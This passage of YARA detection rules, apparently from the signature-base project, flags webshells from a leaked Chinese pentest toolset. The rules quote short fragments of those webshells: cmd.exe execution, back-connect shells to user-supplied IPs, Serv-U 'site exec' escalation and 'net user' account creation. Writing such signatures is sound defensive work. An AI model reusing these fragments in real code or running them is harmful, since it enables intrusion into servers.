		$s5 = "start<asp:TextBox ID=\"Fport_TextBox\" runat=\"server\" Text=\"c:\\\" Width=\"60" ascii
		$s6 = "<div>Code By <a href =\"http://www.hkmjj.com\">Www.hkmjj.Com</a></div>" fullword ascii

	condition:
		filesize <11KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASPX_Aspx : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file aspx.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "4a13c809-48f7-54f7-9ce3-10d6d48104fb"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L529-L546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8378619b2a7d446477946eabaa1e6744dec651c1"
		logic_hash = "b59684633fd72bd1804a96850a8b358db98c169415b6e65fe3ecfb4d9fde72d0"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "string iVDT=\"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin" ascii
		$s1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"FGEy\" AutoPostBack=\"True\" O" ascii
		$s2 = "td.Text=\"<a href=\\\"javascript:Bin_PostBack('urJG','\"+dt.Rows[j][\"ProcessID" ascii
		$s3 = "vyX.Text+=\"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\"+MVVJ(rootkey)+" ascii

	condition:
		filesize <353KB and 2 of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Su7_X_9_X : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file su7.x-9.x.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "5d546ce8-6f8f-5b0b-9472-23f283ef9f80"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L548-L563"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "808396b51023cc8356f8049cfe279b349ca08f1a"
		logic_hash = "2d2398cf0f9e253eea343d39b6555f2633f92f627f1c93cc28123d5a7f3d1bf1"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "returns=httpopen(\"LoginID=\"&user&\"&FullName=&Password=\"&pass&\"&ComboPasswor" ascii
		$s1 = "returns=httpopen(\"\",\"POST\",\"http://127.0.0.1:\"&port&\"/Admin/XML/User.xml?" ascii

	condition:
		filesize <59KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Cfmshell : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file cfmShell.cfm"
		author = "Florian Roth (Nextron Systems)"
		id = "40d50ddb-2963-5d8e-b93a-bb44a8944229"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L565-L580"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "740796909b5d011128b6c54954788d14faea9117"
		logic_hash = "0767012ec8fd4a18a64eca04d459efb55fafd29ed052dab8a0eb1b8f4ce7aa66"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii
		$s4 = "<cfif FileExists(\"#GetTempDirectory()#foobar.txt\") is \"Yes\">" fullword ascii

	condition:
		filesize <4KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Asp4 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file asp4.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "4125bb40-3f5c-53f5-b906-54fa77b119f5"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L582-L598"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "4005b83ced1c032dc657283341617c410bc007b8"
		logic_hash = "ae02d1efc975a8592a00cbab823355fb778fbb589f5752dd913aa432b316c3a4"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "if ShellPath=\"\" Then ShellPath = \"cmd.exe\"" fullword ascii
		$s6 = "Response.Cookies(Cookie_Login) = sPwd" fullword ascii
		$s8 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii

	condition:
		filesize <150KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Serv_U_2_Admin_By_Lake2 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file Serv-U 2 admin by lake2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "8fce8835-a4ed-58df-a725-0c1fc04becaa"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L600-L617"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cb8039f213e611ab2687edd23e63956c55f30578"
		logic_hash = "a67c08b3a4bed2385d2fa8c007615bfb37a2d739cc13ee2e0f5eda00536b6ea8"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/lake2\", True" fullword ascii
		$s2 = "response.write \"FTP user lake  pass admin123 :)<br><BR>\"" fullword ascii
		$s8 = "<p>Serv-U Local Get SYSTEM Shell with ASP" fullword ascii
		$s9 = "\"-HomeDir=c:\\\\\" & vbcrlf & \"-LoginMesFile=\" & vbcrlf & \"-Disable=0\" & vb" ascii

	condition:
		filesize <17KB and 2 of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php3 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php3.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "3000ac40-35de-5d24-85fb-4d105b07c2e7"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L619-L634"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "e2924cb0537f4cdfd6f1bd44caaaf68a73419b9d"
		logic_hash = "ba3892feacbbe3d7c6b6308a22ca22b19ae84b6490df2c976852260da2a96ca1"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "} elseif(@is_resource($f = @popen($cfe,\"r\"))) {" fullword ascii
		$s2 = "cf('/tmp/.bc',$back_connect);" fullword ascii

	condition:
		filesize <8KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Serv_U_By_Goldsun : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file Serv-U_by_Goldsun.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "d8b85c33-b05d-531a-9c0a-a1dddcae0da4"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L636-L653"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d4d7a632af65a961a1dbd0cff80d5a5c2b397e8c"
		logic_hash = "962b2e75c03f716fc039cf26aa238e9a3faf5a7ea8fb3d4da556fa601790055a"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True," ascii
		$s2 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" &" ascii
		$s3 = "127.0.0.1:<%=port%>," fullword ascii
		$s4 = "GName=\"http://\" & request.servervariables(\"server_name\")&\":\"&request.serve" ascii

	condition:
		filesize <30KB and 2 of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php10 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php10.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "5fe78cc6-8be3-595f-a082-e361259938e5"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L655-L670"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3698c566a0ae07234c8957112cdb34b79362b494"
		logic_hash = "76bb2dfd518173f031cc3c93b2098edaef4aca09f0dd8228223257b0b7df452b"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "dumpTable($N,$M,$Hc=false){if($_POST[\"format\"]!=\"sql\"){echo\"\\xef\\xbb\\xbf" ascii
		$s2 = "';if(DB==\"\"||!$od){echo\"<a href='\".h(ME).\"sql='\".bold(isset($_GET[\"sql\"]" ascii

	condition:
		filesize <600KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Serv_U_Servu : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file servu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3e50d991-7297-5766-b68a-e74aa34ce042"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L671-L686"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7de701b86820096e486e64ca34f1fa9f2fbba641"
		logic_hash = "d3956b6daa0649233372aea4176e0d43c44d866146884222f92b7efe01f288bb"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "fputs ($conn_id, \"SITE EXEC \".$dir.\"cmd.exe /c \".$cmd.\"\\r\\n\");" fullword ascii
		$s1 = "function ftpcmd($ftpport,$user,$password,$dir,$cmd){" fullword ascii

	condition:
		filesize <41KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Portrecall_Jsp2 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file jsp2.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "cd34cb47-c5e0-5094-a501-6a8a00d94018"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L688-L704"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "412ed15eb0d24298ba41731502018800ffc24bfc"
		logic_hash = "1ec77a1b0d30cdebce1b5b07445247016230b733a594d8d1de642c2c8af63031"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "final String remoteIP =request.getParameter(\"remoteIP\");" fullword ascii
		$s4 = "final String localIP = request.getParameter(\"localIP\");" fullword ascii
		$s20 = "final String localPort = \"3390\";//request.getParameter(\"localPort\");" fullword ascii

	condition:
		filesize <23KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASPX_Aspx2 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file aspx2.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "0da59fde-2214-5677-943f-05b8da4fd9d4"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L706-L723"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "95db7a60f4a9245ffd04c4d9724c2745da55e9fd"
		logic_hash = "7af90992bc3f708d877dcd5841c0d132793e41a0796607907084516d955b3ae0"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if (password.Equals(this.txtPass.Text))" fullword ascii
		$s1 = "<head runat=\"server\">" fullword ascii
		$s2 = ":<asp:TextBox runat=\"server\" ID=\"txtPass\" Width=\"400px\"></asp:TextBox>" fullword ascii
		$s3 = "this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\"PATH_INFO\"]);" fullword ascii

	condition:
		uint16(0)==0x253c and filesize <9KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Hy2006A : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file hy2006a.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "115651d3-63e1-58e3-b27c-42271111bb91"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L725-L740"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "20da92b2075e6d96636f883dcdd3db4a38c01090"
		logic_hash = "a24bf11a2728bb8d18ea005b057648770956694e0b257d4464ad15ee3e24eda2"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s15 = "Const myCmdDotExeFile = \"command.com\"" fullword ascii
		$s16 = "If LCase(appName) = \"cmd.exe\" And appArgs <> \"\" Then" fullword ascii

	condition:
		filesize <406KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php1 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php1.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "5fe78cc6-8be3-595f-a082-e361259938e5"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L742-L758"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "c2f4b150f53c78777928921b3a985ec678bfae32"
		logic_hash = "aadf47ac6231b41e720efdd85c481ebac8fccb572e57b86b27a95dd367c0d81b"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "$sendbuf = \"site exec \".$_POST[\"SUCommand\"].\"\\r\\n\";" fullword ascii
		$s8 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c" ascii
		$s18 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport" ascii

	condition:
		filesize <621KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Jspshell2 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file jspshell2.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "ff72f94b-1c0a-5615-b35f-35f69c920292"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L760-L775"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cc7bc1460416663012fc93d52e2078c0a277ff79"
		logic_hash = "3a60991fa557655fbd2450739976ac612a0ea2a3df22873382b05438cac12762"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s10 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii
		$s11 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt" ascii

	condition:
		filesize <424KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Tuoku_Script_Mysql : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file mysql.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "fa0627fb-a40c-5856-ae78-17d33910878f"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L777-L791"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8e242c40aabba48687cfb135b51848af4f2d389d"
		logic_hash = "bde2ea1ccfc88138456a1b255a32a7323f5ef0f677499db6dc6670987cc37585"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "txtpassword.Attributes.Add(\"onkeydown\", \"SubmitKeyClick('btnLogin');\");" fullword ascii
		$s2 = "connString = string.Format(\"Host = {0}; UserName = {1}; Password = {2}; Databas" ascii

	condition:
		filesize <202KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php9 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php9.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "c8cbee10-78ea-5a6f-9c80-7e51a9c38440"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L793-L807"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cd3962b1dba9f1b389212e38857568b69ca76725"
		logic_hash = "bea117862ebc9220a4d9aee091c808274f9907fceb83b528055998ddcc90aa5f"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r ab" ascii

	condition:
		filesize <1087KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Portrecall_Jsp : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file jsp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "cd34cb47-c5e0-5094-a501-6a8a00d94018"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L809-L823"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "65e8e4d13ad257c820cad12eef853c6d0134fce8"
		logic_hash = "98f279c3e50308f67f88ecf8459943187ea152664fe0206c4a7d3435242df2a6"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2" ascii

	condition:
		filesize <1KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASPX_Aspx3 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file aspx3.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "4f835136-744a-5324-a1f4-02d1cfa2cab6"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L825-L840"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "dd61481771f67d9593214e605e63b62d5400c72f"
		logic_hash = "11bf511ee70ff4bde0a9320cb80dd9efa0f437d432c78a859153cfcc8e80db01"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Process p1 = Process.Start(\"\\\"\" + txtRarPath.Value + \"\\\"\", \" a -y -k -m" ascii
		$s12 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS:" ascii

	condition:
		filesize <100KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASPX_Shell_Shell : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file shell.aspx"
		author = "Florian Roth (Nextron Systems)"
		id = "8fbcae22-07b7-5afe-9f15-06e2f426b5ca"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L842-L857"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1816006827d16ed73cefdd2f11bd4c47c8af43e4"
		logic_hash = "ac22d89353b4316289bf6c6e13332ac401f4b57f6c29b71861cb48359c1e55f9"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook" ascii
		$s1 = "<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>" fullword ascii

	condition:
		filesize <1KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell__Php1_Php7_Php9 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "cfc2f624-976f-5ff6-bd07-10948b9290bc"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L859-L878"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "6ea5b362f8d8f2e99725d4dd4d2ada5c3939a45a3dde0084571600452ab4673c"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "c2f4b150f53c78777928921b3a985ec678bfae32"
		hash1 = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
		hash2 = "cd3962b1dba9f1b389212e38857568b69ca76725"

	strings:
		$s1 = "<a href=\"?s=h&o=wscript\">[WScript.shell]</a> " fullword ascii
		$s2 = "document.getElementById('cmd').value = Str[i];" fullword ascii
		$s3 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii

	condition:
		filesize <300KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell__Serv_U_By_Goldsun_Asp3_Serv_U_Asp : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "e91e05e8-0f6d-57a7-a649-a834733f17c8"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L880-L899"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b733e80f234a85a4f65eedd94f535860b4da464adb80a91afc547a8d96b5dc7a"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "d4d7a632af65a961a1dbd0cff80d5a5c2b397e8c"
		hash1 = "87c5a76989bf08da5562e0b75c196dcb3087a27b"
		hash2 = "cee91cd462a459d31a95ac08fe80c70d2f9c1611"

	strings:
		$s1 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii
		$s2 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii
		$s3 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCr" ascii

	condition:
		filesize <444KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell__Asp4_Asp4_MSSQL__MSSQL_ : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e0070f0d-35d0-5024-88e7-e0e04b29f485"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L901-L921"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "a8ec5ad87c83c16f47391c3ce08cee74c6be1e42c288eec6d1559867d28489c6"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "4005b83ced1c032dc657283341617c410bc007b8"
		hash1 = "4005b83ced1c032dc657283341617c410bc007b8"
		hash2 = "7097c21f92306983add3b5b29a517204cd6cd819"
		hash3 = "7097c21f92306983add3b5b29a517204cd6cd819"

	strings:
		$s0 = "\"<form name=\"\"searchfileform\"\" action=\"\"?action=searchfile\"\" method=\"" ascii
		$s1 = "\"<TD ALIGN=\"\"Left\"\" colspan=\"\"5\"\">[\"& DbName & \"]" fullword ascii
		$s2 = "Set Conn = Nothing " fullword ascii

	condition:
		filesize <341KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell__Injection_Jmcook_Jmpost_Manualinjection : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "e154ecb5-9d56-520a-b76a-635a8864f0a8"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L923-L942"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "0f3a4f81326154a6a6ac448d18be29ad534917bc39aba26cc458f06b43001681"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "3484ed16e6f9e0d603cbc5cb44e46b8b7e775d35"
		hash1 = "5e1851c77ce922e682333a3cb83b8506e1d7395d"
		hash2 = "f80ec26bbdc803786925e8e0450ad7146b2478ff"
		hash3 = "e83d427f44783088a84e9c231c6816c214434526"

	strings:
		$s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii
